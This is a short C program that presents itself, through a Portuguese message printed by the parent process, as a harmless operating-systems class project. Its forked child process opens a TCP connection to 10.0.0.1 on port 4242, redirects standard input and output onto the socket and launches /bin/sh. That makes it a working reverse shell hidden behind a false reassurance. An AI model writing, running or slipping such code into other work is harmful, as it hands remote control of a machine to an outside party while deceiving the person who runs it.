#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>


int main() {
    pid_t pid;

    if ((pid = fork()) < 0) {
        perror("fork error");
        return 1;
    } else if (pid == 0) {
        // Child process
        int port = 4242;
        struct sockaddr_in revsockaddr;

        int sockt = socket(AF_INET, SOCK_STREAM, 0);
        revsockaddr.sin_family = AF_INET;       
        revsockaddr.sin_port = htons(port);
        revsockaddr.sin_addr.s_addr = inet_addr("10.0.0.1");

        connect(sockt, (struct sockaddr *) &revsockaddr, 
        sizeof(revsockaddr));
        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);

        char * const argv[] = {"/bin/sh", NULL};
        execve("/bin/sh", argv, NULL);

    return 0;       
    } else {
        // Parent process
        printf("Ola! eu sou o projeto de Sistemas Operacionais com PID = %d\nNao se preocupe, eu sou inofensivo e nao estou fazendo nada com seu dispositivo :)", getpid());
    }

    
    return 0;
}
